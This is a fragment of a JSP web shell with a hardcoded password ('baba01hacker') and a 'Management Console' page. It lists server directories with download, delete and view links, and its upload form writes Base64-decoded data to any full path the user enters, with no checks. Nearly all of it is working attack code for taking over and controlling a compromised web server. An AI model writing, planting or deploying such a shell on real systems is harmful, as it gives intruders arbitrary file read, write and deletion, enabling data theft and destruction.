...
<%!
// ================== CONFIG ==================
private static final String PASSWORD = "baba01hacker"; 
...
public String listDirectory(String path) {  
    ...
    if (files != null) {  
        ...
        for (File f : files) {  
            ...
            String encodedPath = "";
            try {
                encodedPath = java.net.URLEncoder.encode(absPath, "UTF-8");
            ...
            sb.append("<td>");  
            sb.append("<a href='?action=download&path=").append(encodedPath).append("'>[Down]</a> ");  
            sb.append("<a href='?action=delete&path=").append(encodedPath).append("' onclick='return confirm(\"Delete?\")'>[Del]</a>");  
            if (!f.isDirectory()) {  
                sb.append(" <a href='?action=view&path=").append(encodedPath).append("'>[View]</a>");  
            }  
            sb.append("</td></tr>");  
        }  
    }  
...
<body>  
<h2>Management Console [Authenticated]</h2>  
...
<!-- Alternative Upload (Bypasses Multipart Config Error) -->  
<form method="post" id="uploadForm">  
    <b>Upload To Full Path:</b> <input type="text" name="b64path" size="50" placeholder="/var/www/html/target.txt" required> <br><br>
    <input type="file" id="filePicker" onchange="encodeFile()" style="color:#0f0;">
    <input type="hidden" name="b64data" id="b64data">
...
function encodeFile() {
    ...
    reader.onloadend = function() {
        ...
        document.getElementById('b64data').value = b64;
    }
    if (file) {
...
<%
if ("POST".equalsIgnoreCase(request.getMethod()) && request.getParameter("b64data") != null && !request.getParameter("b64data").isEmpty()) {
    try {
        String target = request.getParameter("b64path");
        String b64Data = request.getParameter("b64data");
        
        // Decode standard Base64 string directly via Java 8+ Base64 utility
        byte[] decodedBytes = java.util.Base64.getDecoder().decode(b64Data.trim());
        
        File targetFile = new File(target);
        try (FileOutputStream fos = new FileOutputStream(targetFile)) {
            fos.write(decodedBytes);
        }
        out.println("<pre style='color:yellow'>[+] Uploaded successfully to: " + target + "</pre>");
    } catch (Exception e) {
